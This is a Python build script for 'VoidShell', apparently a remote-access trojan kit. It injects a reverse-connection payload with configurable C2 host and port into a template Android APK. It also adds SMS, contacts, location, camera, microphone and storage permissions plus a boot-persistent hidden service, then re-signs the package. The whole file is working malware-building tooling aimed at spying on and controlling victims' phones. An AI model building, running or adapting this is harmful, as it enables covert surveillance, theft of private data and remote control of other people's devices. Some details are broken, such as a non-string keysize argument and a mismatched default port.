#!/usr/bin/env python3
# builder.py - VoidShell v2.0 Production APK Builder (2025)
# Works locally + GitHub Actions + fully automated

import argparse
import os
import shutil
import subprocess
import sys
import zipfile
import uuid
import datetime
import base64
from pathlib import Path

# -------------------------- CONFIG --------------------------
TEMPLATE_APK = "template.apk"           # ← Put a clean minimal APK here (e.g. HelloWorld)
KEYSTORE = "voidshell.keystore"         # Will be auto-generated if missing
KEYSTORE_ALIAS = "voidshell"
KEYSTORE_PASS = os.getenv("KEYSTORE_PASS", "voidshell123")
BUILD_DIR = Path("build_tmp")
DIST_DIR = Path("dist")
PAYLOAD_FILE = "voidshell_payload.py"   # Your final payload from previous message
# -----------------------------------------------------------

def log(msg):
    print(f"[+] {msg}")

def error(msg):
    print(f"[-] {msg}")
    sys.exit(1)

def ensure_template():
    if not Path(TEMPLATE_APK).exists():
        error(f"template.apk not found! Drop a minimal signed APK (any app) as {TEMPLATE_APK}")

def create_keystore_if_missing():
    if not Path(KEYSTORE).exists():
        log("Generating new debug keystore...")
        subprocess.run([
            "keytool", "-genkey", "-v",
            "-keystore", KEYSTORE,
            "-alias", KEYSTORE_ALIAS,
            "-keyalg", "RSA",
            "-keysize", 2048,
            "-validity", 10000,
            "-storepass", KEYSTORE_PASS,
            "-keypass", KEYSTORE_PASS,
            "-dname", "CN=VoidShell, OU=APT, O=GH, C=GH"
        ], check=True)

def build_apk(lhost: str, lport: str, output_apk: str):
    # Clean & prepare
    if BUILD_DIR.exists():
        shutil.rmtree(BUILD_DIR)
    DIST_DIR.mkdir(exist_ok=True)
    BUILD_DIR.mkdir()

    log("Extracting template APK...")
    with zipfile.ZipFile(TEMPLATE_APK, 'r') as zip_ref:
        zip_ref.extractall(BUILD_DIR)

    # Inject obfuscated payload
    payload_src = Path(PAYLOAD_FILE)
    if not payload_src.exists():
        error(f"Payload not found: {PAYLOAD_FILE}")

    payload_content = payload_src.read_text()
    payload_content = payload_content.replace("194.169.34.12", lhost)
    payload_content = payload_content.replace("443", lport)

    assets_dir = BUILD_DIR / "assets"
    assets_dir.mkdir(exist_ok=True)
    (assets_dir / "payload.py").write_text(payload_content)
    log(f"Injected payload → LHOST={lhost} LPORT={lport}")

    # Update AndroidManifest.xml - Full stealth permissions
    manifest_path = BUILD_DIR / "AndroidManifest.xml"
    manifest = manifest_path.read_text()

    permissions = """
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
    <uses-permission android:name="android.permission.WAKE_LOCK"/>
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
    <uses-permission android:name="android.permission.READ_SMS"/>
    <uses-permission android:name="android.permission.SEND_SMS"/>
    <uses-permission android:name="android.permission.READ_CONTACTS"/>
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
    <uses-permission android:name="android.permission.CAMERA"/>
    <uses-permission android:name="android.permission.RECORD_AUDIO"/>
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"/>
    """

    service = """
    <service
        android:name="com.voidshell.ServiceRunner"
        android:enabled="true"
        android:exported="false">
        <intent-filter>
            <action android:name="android.intent.action.BOOT_COMPLETED"/>
        </intent-filter>
    </service>
    """

    if "<uses-permission" not in manifest:
        manifest = manifest.replace("<application", permissions + "\n    <application")
    if "ServiceRunner" not in manifest:
        manifest = manifest.replace("</application>", service + "\n    </application>")

    manifest_path.write_text(manifest)
    log("Injected permissions + boot service")

    # Re-package
    unsigned_apk = BUILD_DIR / "../VoidShell-unsigned.apk"
    log("Repackaging APK...")
    subprocess.run(["zip", "-r", str(unsigned_apk), "."], cwd=BUILD_DIR, check=True)

    # Align & sign
    aligned_apk = DIST_DIR / "VoidShell-aligned.apk"
    final_apk = Path(output_apk)

    log("Aligning APK...")
    subprocess.run(["zipalign", "-v", "-p", "4", str(unsigned_apk), str(aligned_apk)], check=True)

    log("Signing with apksigner...")
    subprocess.run([
        "apksigner", "sign",
        "--ks", KEYSTORE,
        "--ks-key-alias", KEYSTORE_ALIAS,
        "--ks-pass", f"pass:{KEYSTORE_PASS}",
        "--out", str(final_apk),
        str(aligned_apk)
    ], check=True)

    # Cleanup
    shutil.rmtree(BUILD_DIR)
    unsigned_apk.unlink(missing_ok=True)
    aligned_apk.unlink(missing_ok=True)

    log(f"APK built successfully!")
    log(f"→ {final_apk.absolute()} ({final_apk.stat().st_size // 1024} KB)")

def main():
    parser = argparse.ArgumentParser(description="VoidShell Production APK Builder")
    parser.add_argument("--lhost", required=True, default="127.0.0.1",  help="C2 LHOST (IP or domain)")
    parser.add_argument("--lport", default="4433", help="C2 LPORT (default: 443)")
    parser.add_argument("--output", default=None, help="Output APK path")
    args = parser.parse_args()

    build_id = datetime.datetime.now().strftime("%Y%m%d-%H%M%S")
    default_name = f"dist/VoidShell-{build_id}-{args.lhost}-{args.lport}.apk"
    output_path = args.output or default_name

    ensure_template()
    create_keystore_if_missing()
    build_apk(args.lhost, args.lport, output_path)

if __name__ == "__main__":
    main()
